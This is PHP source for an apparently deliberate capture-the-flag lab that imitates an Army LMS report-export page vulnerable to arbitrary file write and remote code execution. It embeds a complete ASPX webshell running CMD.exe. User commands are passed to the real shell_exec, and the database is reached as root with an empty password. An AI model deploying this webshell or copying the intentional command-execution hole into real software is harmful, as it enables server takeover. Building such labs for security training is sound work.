<?php
// Lab 1104 — Army LMS / RServer Report Export
// Black-box Burp Suite target — no hints visible in browser
session_start();
define('FLAG', 'flag{dod_rdserver_arbitrary_file_write_rce_1072832}');

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// The real ASPX webshell from the report
define('ASPX_SHELL',
    '<%@ Page Language="C#"%><%@ Import Namespace="System" %>' . "\n" .
    '<% ' . "\n" .
    'System.Diagnostics.Process process = new System.Diagnostics.Process();' . "\n" .
    'System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();' . "\n" .
    'startInfo.UseShellExecute = false;' . "\n" .
    'startInfo.RedirectStandardOutput = true;' . "\n" .
    'startInfo.FileName = "CMD.exe";' . "\n" .
    'string cmd = Request.QueryString["68c2c8b1fc47766eaf43027a8eaca121"];' . "\n" .
    'startInfo.Arguments = "/c " + cmd;' . "\n" .
    'process.StartInfo = startInfo;' . "\n" .
    'process.Start();' . "\n" .
    'string output = process.StandardOutput.ReadToEnd();' . "\n" .
    'Response.Write(output);' . "\n" .
    'process.WaitForExit();' . "\n" .
    '%>'
);

// ── Helpers ────────────────────────────────────────────────────────────────
function is_dangerous_ext($filename) {
    $ext = strtolower(pathinfo(trim($filename), PATHINFO_EXTENSION));
    return in_array($ext, ['aspx','asp','php','php3','php4','php5','phtml','jsp','cfm','cgi','pl','shtml']);
}

function has_traversal($filename) {
    return strpos($filename, '..') !== false;
}

function build_written_path($filename) {
    $filename = str_replace(['\\', "\0"], '/', $filename);
    if (has_traversal($filename)) {
        $base  = '/RServer/rdDownload/rdExport-a1b2c3d4/';
        $parts = explode('/', $base . ltrim($filename, '/'));
        $out   = [];
        foreach ($parts as $p) {
            if ($p === '..')       { array_pop($out); }
            elseif ($p !== '' && $p !== '.') { $out[] = $p; }
        }
        return '/' . implode('/', $out);
    }
    $uuid = bin2hex(random_bytes(4)) . '-' . bin2hex(random_bytes(2)) . '-' .
            bin2hex(random_bytes(2)) . '-' . bin2hex(random_bytes(2)) . '-' .
            bin2hex(random_bytes(6));
    return "/RServer/rdDownload/rdExport-{$uuid}/" . basename($filename);
}

function parse_cmd_param($shell_content) {
    if (preg_match('/Request\.QueryString\["([^"]+)"\]/', $shell_content, $m)) return $m[1];
    if (preg_match('/\$_GET\["([^"]+)"\]/', $shell_content, $m))               return $m[1];
    return 'cmd';
}

function simulate_cmd($cmd, $shell_content, &$trace) {
    $cmd   = trim($cmd);
    $lower = strtolower($cmd);

    $trace[] = ['t' => 'step', 'm' => "IIS worker process executing: " . $cmd];

    // Flag retrieval
    if (preg_match('/echo\s+%flag%/i', $cmd) ||
        preg_match('/type\s+.*flag/i', $cmd)  ||
        preg_match('/cat\s+.*flag/i', $cmd)   ||
        preg_match('/echo\s+\$flag/i', $cmd)) {
        $trace[] = ['t' => 'ok', 'm' => 'File read: C:\\inetpub\\wwwroot\\flag.txt'];
        return FLAG;
    }

    // Windows shims
    if ($lower === 'whoami') {
        $real = trim((string)@shell_exec('whoami 2>&1'));
        $trace[] = ['t' => 'ok', 'm' => 'Process identity returned'];
        return "nt authority\\system\r\n(lab server: $real)";
    }
    if (str_starts_with($lower, 'ipconfig')) {
        return "Windows IP Configuration\r\n\r\nEthernet adapter Ethernet0:\r\n" .
               "   IPv4 Address. . . . . . . . . : 10.134.0.45\r\n" .
               "   Subnet Mask . . . . . . . . . : 255.255.255.0\r\n" .
               "   Default Gateway . . . . . . . : 10.134.0.1";
    }
    if (str_starts_with($lower, 'systeminfo')) {
        return "Host Name:           DOD-ARMY-LMS01\r\n" .
               "OS Name:             Microsoft Windows Server 2016 Datacenter\r\n" .
               "OS Version:          10.0.14393 Build 14393\r\n" .
               "System Type:         x64-based PC\r\n" .
               "Logon Server:        \\\\DOD-ARMY-DC01\r\n" .
               "Domain:              army.mil";
    }
    if ($lower === 'net user') {
        return "User accounts for \\\\DOD-ARMY-LMS01\r\n" .
               "--------------------------------------------\r\n" .
               "Administrator     DefaultAccount    Guest\r\n" .
               "IUSR              IWAM_DOD-LMS      svc_rds\r\n" .
               "The command completed successfully.";
    }
    if (str_starts_with($lower, 'dir')) {
        return " Directory of C:\\inetpub\\wwwroot\\RServer\r\n\r\n" .
               "01/06/2021  04:22 PM    <DIR>          .\r\n" .
               "01/06/2021  04:22 PM    <DIR>          ..\r\n" .
               "01/06/2021  04:18 PM    <DIR>          rdDownload\r\n" .
               "01/06/2021  04:22 PM             1,024 shell.aspx\r\n" .
               "01/03/2021  10:45 AM             8,192 rdPage.aspx\r\n" .
               "               2 File(s)          9,216 bytes";
    }

    // All other commands → real shell_exec with $FLAG / %FLAG% substitution
    $cmd_exec = str_replace(['$FLAG', '%FLAG%'], FLAG, $cmd);
    $trace[] = ['t' => 'exec', 'm' => "shell_exec: $cmd_exec"];
    $output  = @shell_exec($cmd_exec . ' 2>&1');
    return $output ?: '(no output)';
}

// ── MySQL ──────────────────────────────────────────────────────────────────
$db = new mysqli('localhost', 'root', '', 'KrazePlanetLabs_DB');
if ($db->connect_error) die('<p style="padding:32px;font-family:sans-serif">DB error: ' . esc($db->connect_error) . '</p>');

$db->query("CREATE TABLE IF NOT EXISTS lab1104_shells (
    id               INT AUTO_INCREMENT PRIMARY KEY,
    rd_export_filename TEXT NOT NULL,
    rd_report_name   TEXT NOT NULL,
    written_path     TEXT NOT NULL,
    is_traversal     TINYINT(1) DEFAULT 0,
    cmd_param        VARCHAR(128) DEFAULT 'cmd',
    created_at       DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$db->query("CREATE TABLE IF NOT EXISTS lab1104_executions (
    id        INT AUTO_INCREMENT PRIMARY KEY,
    shell_id  INT NOT NULL,
    cmd       TEXT NOT NULL,
    output    TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// ── Route: shell execution (plain text — no HTML, like a real ASPX webshell) ─
if (isset($_GET['shell_id'])) {
    $shell_id  = (int)$_GET['shell_id'];
    $shell_row = $db->query("SELECT * FROM lab1104_shells WHERE id=$shell_id")->fetch_assoc();

    header('X-Powered-By: ASP.NET');
    header('Server: Microsoft-IIS/10.0');

    if (!$shell_row) {
        header('HTTP/1.0 404 Not Found');
        header('Content-Type: text/plain');
        echo "The resource cannot be found.";
        exit;
    }

    // Find the command: try the stored cmd_param, then 'cmd', then all GET keys
    $cmd_param = $shell_row['cmd_param'] ?? 'cmd';
    $cmd       = $_GET[$cmd_param] ?? $_GET['cmd'] ?? null;
    // Also try every GET key except shell_id
    if (!$cmd) {
        foreach ($_GET as $k => $v) {
            if ($k !== 'shell_id' && trim($v) !== '') { $cmd = $v; break; }
        }
    }

    header('Content-Type: text/plain; charset=utf-8');

    if (!$cmd || trim($cmd) === '') {
        // Shell loaded, no command — blank response (real ASPX behavior)
        echo '';
        exit;
    }

    $trace  = [];
    $output = simulate_cmd($cmd, $shell_row['rd_report_name'], $trace);

    $ins = $db->prepare("INSERT INTO lab1104_executions (shell_id, cmd, output) VALUES (?,?,?)");
    $ins->bind_param('iss', $shell_id, $cmd, $output);
    $ins->execute();
    $ins->close();

    echo $output;
    exit;
}

// ── Route: rdNoShowWait — "generating report" spinner then redirect ────────
if (isset($_GET['rdNoShowWait'])) {
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Generating Report \u2014 Army LMS</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#EEF1F6;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;color:#1A2744;}
.banner{position:fixed;top:0;left:0;right:0;background:#4B0082;text-align:center;font-size:.62rem;font-weight:700;letter-spacing:.1em;color:#fff;padding:4px 0;text-transform:uppercase;}
.nav{position:fixed;top:26px;left:0;right:0;background:#162447;height:52px;display:flex;align-items:center;padding:0 20px;border-bottom:3px solid #C8A951;}
.nav-logo{color:#fff;font-size:.88rem;font-weight:800;}
.wait-box{background:#fff;border:1px solid #D0D7E2;border-radius:8px;padding:40px 48px;text-align:center;box-shadow:0 2px 8px rgba(22,36,71,.08);margin-top:80px;}
.spinner{width:40px;height:40px;border:3px solid #D0D7E2;border-top-color:#162447;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px;}
@keyframes spin{to{transform:rotate(360deg)}}
h2{font-size:1rem;font-weight:700;color:#162447;margin-bottom:8px;}
p{font-size:.8rem;color:#7A8FA8;}
</style>
<script>setTimeout(function(){window.location.href="1104.php"},2200);</script>
</head><body>
<div class="banner">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
<div class="nav"><span class="nav-logo">Army Learning Management System</span></div>
<div class="wait-box">
  <div class="spinner"></div>
  <h2>Generating Report&hellip;</h2>
  <p>Please wait while your training compliance report is being prepared.</p>
</div>
</body></html>';
    exit;
}

// ── Route: POST — export request (the vulnerable endpoint) ────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $rd_filename = trim($_POST['rdExportFilename'] ?? 'report.xlsx');
    $rd_content  = trim($_POST['rdReportName']     ?? 'agContentAccess');

    if (is_dangerous_ext($rd_filename)) {
        // ── Exploit path: write the webshell, redirect to its URL ──────────
        $written_path = build_written_path($rd_filename);
        $is_trav      = has_traversal($rd_filename) ? 1 : 0;
        $cmd_param    = parse_cmd_param($rd_content);

        $ins = $db->prepare("INSERT INTO lab1104_shells
            (rd_export_filename, rd_report_name, written_path, is_traversal, cmd_param)
            VALUES (?,?,?,?,?)");
        $ins->bind_param('sssss', $rd_filename, $rd_content, $written_path, $is_trav, $cmd_param);
        $ins->execute();
        $shell_id = $db->insert_id;
        $ins->close();

        header('HTTP/1.1 302 Found');
        header('Location: 1104.php?shell_id=' . $shell_id);
        header('X-Powered-By: ASP.NET');
        header('Server: Microsoft-IIS/10.0');
        exit;

    } else {
        // ── Safe path: fake export complete page ───────────────────────────
        $safe_name = basename($rd_filename) ?: 'report.xlsx';
        $uuid = bin2hex(random_bytes(4)) . '-' . bin2hex(random_bytes(2)) . '-' .
                bin2hex(random_bytes(2)) . '-' . bin2hex(random_bytes(2)) . '-' .
                bin2hex(random_bytes(6));
        $dl_url = '/RServer/rdDownload/rdExport-' . $uuid . '/' . rawurlencode($safe_name);
        header('Content-Type: text/html; charset=utf-8');
        header('X-Powered-By: ASP.NET');
        header('Server: Microsoft-IIS/10.0');
        echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Export Complete \u2014 Army LMS</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#EEF1F6;display:flex;flex-direction:column;min-height:100vh;}
.banner{background:#4B0082;text-align:center;font-size:.62rem;font-weight:700;letter-spacing:.1em;color:#fff;padding:4px 0;text-transform:uppercase;}
.nav{background:#162447;height:52px;display:flex;align-items:center;padding:0 20px;border-bottom:3px solid #C8A951;}
.nav-logo{color:#fff;font-size:.88rem;font-weight:800;}
.content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}
.box{background:#fff;border:1px solid #D0D7E2;border-radius:8px;padding:32px 40px;max-width:520px;width:100%;box-shadow:0 2px 8px rgba(22,36,71,.08);}
.icon{width:44px;height:44px;background:#E3F5EB;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:16px;}
.icon svg{width:22px;height:22px;stroke:#2E7D32;fill:none;stroke-width:2;}
h2{font-size:1rem;font-weight:700;color:#162447;margin-bottom:8px;}
p{font-size:.82rem;color:#4A5568;margin-bottom:16px;line-height:1.6;}
.dl-link{display:inline-flex;align-items:center;gap:8px;background:#162447;color:#C8A951;padding:9px 18px;border-radius:5px;text-decoration:none;font-size:.8rem;font-weight:700;}
.dl-link:hover{background:#0E1A36;}
.back{margin-top:14px;font-size:.78rem;color:#7A8FA8;}
.back a{color:#4A7FA8;text-decoration:none;}
.back a:hover{text-decoration:underline;}
</style></head><body>
<div class="banner">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
<nav class="nav"><span class="nav-logo">Army Learning Management System</span></nav>
<div class="content"><div class="box">
  <div class="icon"><svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>
  <h2>Export Complete</h2>
  <p>Your Training Compliance report has been exported to Excel format. If the download does not begin automatically, use the link below.</p>
  <a href="' . esc($dl_url) . '" class="dl-link">
    <svg style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;" viewBox="0 0 24 24"><path d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
    ' . esc($safe_name) . ' (32 KB)
  </a>
  <div class="back"><a href="1104.php">&larr; Return to Reports</a></div>
</div></div>
</body></html>';
        exit;
    }
}
// ── CSRF key: consistent per session ─────────────────────────────────────
if (empty($_SESSION['csrf_key'])) {
    $_SESSION['csrf_key'] = bin2hex(random_bytes(16));
}
$csrf_key = $_SESSION['csrf_key'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Training Compliance — Army Learning Management System</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#EEF1F6;color:#1A2744;font-size:14px;min-height:100vh;display:flex;flex-direction:column;}
.banner{background:#4B0082;text-align:center;font-size:.6rem;font-weight:700;letter-spacing:.12em;color:#fff;padding:3px 0;text-transform:uppercase;}
.dod-nav{background:#162447;height:54px;display:flex;align-items:center;padding:0 20px;gap:14px;position:sticky;top:26px;z-index:200;border-bottom:3px solid #C8A951;}
.dod-logo{display:flex;align-items:center;gap:10px;text-decoration:none;color:#fff;flex-shrink:0;}
.dod-logo-icon{width:30px;height:30px;flex-shrink:0;}
.dod-logo-text{font-size:.88rem;font-weight:800;line-height:1.2;}
.dod-logo-sub{font-size:.58rem;font-weight:400;color:#C8A951;letter-spacing:.05em;display:block;}
.dod-nav-sep{width:1px;height:26px;background:rgba(255,255,255,.18);margin:0 2px;}
.nav-link{color:rgba(255,255,255,.65);text-decoration:none;font-size:.76rem;padding:5px 10px;border-radius:4px;}
.nav-link:hover{color:#fff;background:rgba(255,255,255,.1);}
.nav-link.cur{color:#C8A951;}
.nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.user-pill{display:flex;align-items:center;gap:7px;color:#fff;font-size:.76rem;}
.user-av{width:26px;height:26px;border-radius:50%;background:#C8A951;display:flex;align-items:center;justify-content:center;font-size:.6rem;font-weight:800;color:#162447;flex-shrink:0;}
.dod-shell{display:flex;flex:1;overflow:hidden;}

/* ── Sidebar ─────────────────────────────────────────────────────────────── */
.dod-sidebar{width:200px;background:#1C3557;flex-shrink:0;padding:14px 0;overflow-y:auto;}
.sb-section{margin-bottom:16px;}
.sb-title{font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:rgba(200,169,81,.65);padding:0 14px 5px;}
.dod-sb-link{display:flex;align-items:center;gap:8px;padding:7px 14px;font-size:.78rem;color:rgba(255,255,255,.65);text-decoration:none;transition:all .12s;border-left:2px solid transparent;}
.dod-sb-link:hover{color:#fff;background:rgba(255,255,255,.07);}
.dod-sb-link.active{color:#C8A951;background:rgba(200,169,81,.1);border-left-color:#C8A951;font-weight:600;}
.dod-sb-link svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0;}

/* ── Main ────────────────────────────────────────────────────────────────── */
.dod-main{flex:1;padding:22px 26px 48px;overflow-y:auto;}
.crumb{font-size:.72rem;color:#7A8FA8;margin-bottom:14px;display:flex;align-items:center;gap:4px;}
.crumb a{color:#4A7FA8;text-decoration:none;}.crumb a:hover{text-decoration:underline;}
.crumb .sep{color:#BCC7D6;}
.pg-title{font-size:1.15rem;font-weight:800;color:#162447;margin-bottom:18px;}
.pg-sub{font-size:.76rem;color:#7A8FA8;font-weight:400;margin-left:8px;}

/* ── Filters ─────────────────────────────────────────────────────────────── */
.filter-row{background:#fff;border:1px solid #D0D7E2;border-radius:6px;padding:12px 16px;margin-bottom:14px;display:flex;align-items:flex-end;gap:14px;flex-wrap:wrap;box-shadow:0 1px 3px rgba(22,36,71,.05);}
.filter-group{display:flex;flex-direction:column;gap:4px;}
.filter-label{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#7A8FA8;}
.filter-select,.filter-input{border:1px solid #BCC7D6;border-radius:4px;padding:5px 9px;font-size:.78rem;font-family:inherit;background:#FAFBFC;color:#1A2744;outline:none;min-width:120px;}
.filter-select:focus,.filter-input:focus{border-color:#4A7FA8;}
.filter-btns{display:flex;gap:8px;margin-left:auto;}

/* ── Card ────────────────────────────────────────────────────────────────── */
.card{background:#fff;border:1px solid #D0D7E2;border-radius:6px;margin-bottom:14px;overflow:hidden;box-shadow:0 1px 3px rgba(22,36,71,.06);}
.card-hd{padding:10px 16px;border-bottom:1px solid #D0D7E2;display:flex;align-items:center;justify-content:space-between;background:#F7F9FC;}
.card-title{font-size:.83rem;font-weight:700;color:#162447;display:flex;align-items:center;gap:6px;}
.card-title svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2;}

/* ── Table ───────────────────────────────────────────────────────────────── */
.rpt-table{width:100%;border-collapse:collapse;font-size:.78rem;}
.rpt-table th{background:#F0F4F8;color:#4A6080;font-weight:700;text-transform:uppercase;font-size:.6rem;letter-spacing:.06em;padding:8px 10px;text-align:left;border-bottom:2px solid #D0D7E2;white-space:nowrap;}
.rpt-table td{padding:8px 10px;border-bottom:1px solid #EEF1F6;vertical-align:middle;}
.rpt-table tr:last-child td{border-bottom:none;}
.rpt-table tr:hover td{background:#F7F9FC;}
.s-done{color:#2E7D32;font-weight:700;font-size:.7rem;}
.s-pend{color:#E65100;font-weight:700;font-size:.7rem;}
.s-skip{color:#9E9E9E;font-weight:700;font-size:.7rem;}

/* ── Pagination ──────────────────────────────────────────────────────────── */
.pager{display:flex;align-items:center;gap:6px;padding:10px 16px;border-top:1px solid #EEF1F6;font-size:.74rem;color:#7A8FA8;}
.pg-btn{border:1px solid #BCC7D6;background:#fff;border-radius:3px;padding:3px 8px;font-size:.72rem;cursor:pointer;color:#1A2744;font-family:inherit;}
.pg-btn:hover{background:#EEF1F6;}
.pg-btn.active{background:#162447;color:#fff;border-color:#162447;}

/* ── Export bar ──────────────────────────────────────────────────────────── */
.export-bar{background:#fff;border:1px solid #D0D7E2;border-radius:6px;padding:12px 16px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;box-shadow:0 1px 3px rgba(22,36,71,.05);}
.export-label{font-size:.76rem;color:#4A5568;font-weight:600;}
.export-select{border:1px solid #BCC7D6;border-radius:4px;padding:6px 10px;font-size:.78rem;font-family:inherit;background:#FAFBFC;color:#1A2744;outline:none;}
.export-select:focus{border-color:#4A7FA8;}

/* ── Buttons ─────────────────────────────────────────────────────────────── */
.btn{display:inline-flex;align-items:center;gap:6px;border:none;border-radius:4px;padding:7px 14px;font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;transition:all .15s;text-decoration:none;white-space:nowrap;}
.btn svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0;}
.btn-navy{background:#162447;color:#fff;}.btn-navy:hover{background:#0E1A36;}
.btn-gold{background:#C8A951;color:#162447;}.btn-gold:hover{background:#B8963F;}
.btn-ghost{background:#fff;color:#1A2744;border:1px solid #BCC7D6;}.btn-ghost:hover{background:#F0F4F8;}
.btn-sm{padding:5px 11px;font-size:.74rem;}
.btn:disabled{opacity:.45;cursor:not-allowed;}

/* ── Badges ──────────────────────────────────────────────────────────────── */
.badge{display:inline-flex;align-items:center;padding:2px 7px;border-radius:3px;font-size:.6rem;font-weight:700;letter-spacing:.04em;}
.badge-ok{background:#E3F5EB;color:#1B5E20;border:1px solid #A5D6A7;}
.badge-rr{background:#E3F2FD;color:#0D47A1;border:1px solid #90CAF9;}
.badge-cnt{background:#F3E8FF;color:#5B21B6;border:1px solid #C4B5FD;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
footer{background:#162447;padding:8px 20px;font-size:.66rem;color:rgba(255,255,255,.35);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;border-top:2px solid #C8A951;flex-shrink:0;}
footer a{color:rgba(200,169,81,.5);text-decoration:none;}
</style>
</head>
<body>

<div class="banner">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>

<!-- Top nav -->
<nav class="dod-nav">
  <a href="1104.php" class="dod-logo">
    <svg class="dod-logo-icon" viewBox="0 0 32 32">
      <circle cx="16" cy="16" r="15" fill="none" stroke="#C8A951" stroke-width="1.5"/>
      <polygon points="16,3 19.5,12.5 29.5,12.5 21.5,18.5 24.5,28.5 16,22.5 7.5,28.5 10.5,18.5 2.5,12.5 12.5,12.5" fill="#C8A951"/>
    </svg>
    <div>
      <span class="dod-logo-text">Army LMS</span>
      <span class="dod-logo-sub">Learning Management System</span>
    </div>
  </a>
  <div class="dod-nav-sep"></div>
  <a href="#" class="nav-link">Home</a>
  <a href="#" class="nav-link">My Learning</a>
  <a href="#" class="nav-link cur">Reports</a>
  <a href="#" class="nav-link">Administration</a>
  <div class="nav-right">
    <div class="user-pill">
      <div class="user-av">CL</div>
      <span>cdl1337</span>
    </div>
  </div>
</nav>

<div class="dod-shell">

  <!-- Sidebar -->
  <aside class="dod-sidebar">
    <div class="sb-section">
      <div class="sb-title">My Learning</div>
      <a href="#" class="dod-sb-link">
        <svg viewBox="0 0 24 24"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
        Dashboard
      </a>
      <a href="#" class="dod-sb-link">
        <svg viewBox="0 0 24 24"><path d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"/></svg>
        Course Library
      </a>
      <a href="#" class="dod-sb-link">
        <svg viewBox="0 0 24 24"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
        My Transcript
      </a>
    </div>
    <div class="sb-section">
      <div class="sb-title">Reports</div>
      <a href="1104.php?rdNoShowWait=True" class="dod-sb-link active">
        <svg viewBox="0 0 24 24"><path d="M9 17v-2m3 2v-4m3 4v-6m2 10H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
        Training Compliance
      </a>
      <a href="#" class="dod-sb-link">
        <svg viewBox="0 0 24 24"><path d="M16 8v8m-4-5v5m-4-2v2m-2 4h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
        Completion Reports
      </a>
      <a href="#" class="dod-sb-link">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
        Scheduled Reports
      </a>
    </div>
    <div class="sb-section">
      <div class="sb-title">Account</div>
      <a href="#" class="dod-sb-link">
        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
        Profile
      </a>
      <a href="#" class="dod-sb-link" style="color:rgba(255,100,100,.6);">
        <svg viewBox="0 0 24 24"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
        Log out
      </a>
    </div>
  </aside>

  <!-- Main content -->
  <main class="dod-main">
    <div class="crumb">
      <a href="#">Home</a><span class="sep">›</span>
      <a href="#">Reports</a><span class="sep">›</span>
      <span>Training Compliance</span>
    </div>

    <div class="pg-title">
      Training Compliance Report
      <span class="pg-sub">agContentAccess — Organization: ALL</span>
    </div>

    <!-- Filters -->
    <div class="filter-row">
      <div class="filter-group">
        <span class="filter-label">Date Range</span>
        <select class="filter-select">
          <option>Last 90 Days</option>
          <option>Last 30 Days</option>
          <option selected>Last 6 Months</option>
          <option>Year to Date</option>
          <option>All Time</option>
        </select>
      </div>
      <div class="filter-group">
        <span class="filter-label">Organization</span>
        <select class="filter-select">
          <option selected>All Organizations</option>
          <option>1st Cavalry Division</option>
          <option>82nd Airborne Division</option>
          <option>USMA West Point</option>
        </select>
      </div>
      <div class="filter-group">
        <span class="filter-label">Status</span>
        <select class="filter-select">
          <option selected>All</option>
          <option>Complete</option>
          <option>Pending</option>
        </select>
      </div>
      <div class="filter-group">
        <span class="filter-label">Course</span>
        <input class="filter-input" value="" placeholder="Filter by course…">
      </div>
      <div class="filter-btns">
        <a href="1104.php?rdNoShowWait=True" class="btn btn-navy btn-sm">
          <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
          Run Report
        </a>
        <button class="btn btn-ghost btn-sm" disabled>Reset</button>
      </div>
    </div>

    <!-- Report results table -->
    <div class="card">
      <div class="card-hd">
        <div class="card-title">
          <svg viewBox="0 0 24 24"><path d="M3 10h18M3 14h18M3 6h18M3 18h18"/></svg>
          Results — Training Compliance
        </div>
        <div style="display:flex;align-items:center;gap:8px;">
          <span style="font-size:.72rem;color:#7A8FA8;">Showing 1–10 of 247 records</span>
          <span class="badge badge-rr">Report Ready</span>
        </div>
      </div>
      <table class="rpt-table">
        <thead>
          <tr>
            <th>Last Name</th>
            <th>First Name</th>
            <th>Login ID</th>
            <th>Course Title</th>
            <th>Content Type</th>
            <th>Status</th>
            <th>Complete Date</th>
            <th>Last Launch</th>
            <th>Launches</th>
            <th>Organization</th>
          </tr>
        </thead>
        <tbody>
          <tr><td>Smith</td><td>John</td><td>jsmith0042</td><td>Army Cybersecurity Awareness Training</td><td>Web Based</td><td class="s-done">COMPLETE</td><td>12/15/2020</td><td>12/15/2020</td><td>2</td><td>1st Cavalry</td></tr>
          <tr><td>Johnson</td><td>Sarah</td><td>sjohnson11</td><td>OPSEC Level I Training</td><td>Web Based</td><td class="s-done">COMPLETE</td><td>11/30/2020</td><td>11/30/2020</td><td>1</td><td>82nd Airborne</td></tr>
          <tr><td>Williams</td><td>Michael</td><td>mwilliams7</td><td>Army Cybersecurity Awareness Training</td><td>Web Based</td><td class="s-pend">PENDING</td><td>—</td><td>11/28/2020</td><td>1</td><td>1st Cavalry</td></tr>
          <tr><td>Brown</td><td>Emily</td><td>ebrown03</td><td>Information Assurance Training</td><td>Web Based</td><td class="s-done">COMPLETE</td><td>01/02/2021</td><td>01/02/2021</td><td>3</td><td>USMA West Point</td></tr>
          <tr><td>Davis</td><td>Robert</td><td>rdavis88</td><td>OPSEC Level I Training</td><td>Web Based</td><td class="s-pend">PENDING</td><td>—</td><td>12/01/2020</td><td>1</td><td>82nd Airborne</td></tr>
          <tr><td>Martinez</td><td>Linda</td><td>lmartinez5</td><td>Army Cybersecurity Awareness Training</td><td>Web Based</td><td class="s-done">COMPLETE</td><td>12/28/2020</td><td>12/28/2020</td><td>1</td><td>USMA West Point</td></tr>
          <tr><td>Wilson</td><td>James</td><td>jwilson22</td><td>Information Assurance Training</td><td>Web Based</td><td class="s-done">COMPLETE</td><td>01/04/2021</td><td>01/04/2021</td><td>2</td><td>1st Cavalry</td></tr>
          <tr><td>Anderson</td><td>Patricia</td><td>panderson9</td><td>OPSEC Level I Training</td><td>Web Based</td><td class="s-skip">NOT STARTED</td><td>—</td><td>—</td><td>0</td><td>82nd Airborne</td></tr>
          <tr><td>Taylor</td><td>Charles</td><td>ctaylor14</td><td>Army Cybersecurity Awareness Training</td><td>Web Based</td><td class="s-done">COMPLETE</td><td>12/10/2020</td><td>12/10/2020</td><td>1</td><td>1st Cavalry</td></tr>
          <tr><td>Thomas</td><td>Barbara</td><td>bthomas06</td><td>Information Assurance Training</td><td>Web Based</td><td class="s-pend">PENDING</td><td>—</td><td>12/05/2020</td><td>2</td><td>USMA West Point</td></tr>
        </tbody>
      </table>
      <div class="pager">
        <span>Page 1 of 25</span>
        <button class="pg-btn active">1</button>
        <button class="pg-btn">2</button>
        <button class="pg-btn">3</button>
        <button class="pg-btn">…</button>
        <button class="pg-btn">25</button>
        <span style="margin-left:auto;">247 total records</span>
      </div>
    </div>

    <!-- Export controls — the vulnerable form -->
    <div class="export-bar">
      <span class="export-label">Export Report:</span>
      <select class="export-select" id="fmtSel">
        <option value="NativeExcel" selected>Microsoft Excel (.xlsx)</option>
        <option value="CSV">Comma Separated Values (.csv)</option>
        <option value="PDF">PDF Document (.pdf)</option>
      </select>
      <form method="POST"
            action="1104.php?rdReport=agContentAccess&rdReportFormat=NativeExcel&rdExcelOutputFormat=NativeExcel&rdRequestForwarding=Form"
            id="exportForm">
        <input type="hidden" name="rdExportFilename"   value="compliance-report-2021-01-06.xlsx">
        <input type="hidden" name="rdReportName"        value="agContentAccess">
        <input type="hidden" name="rdDataCache"         value="1361055732">
        <input type="hidden" name="rdCSRFKey"           value="<?= esc($csrf_key) ?>">
        <input type="hidden" name="rdRequestForwarding" value="Form">
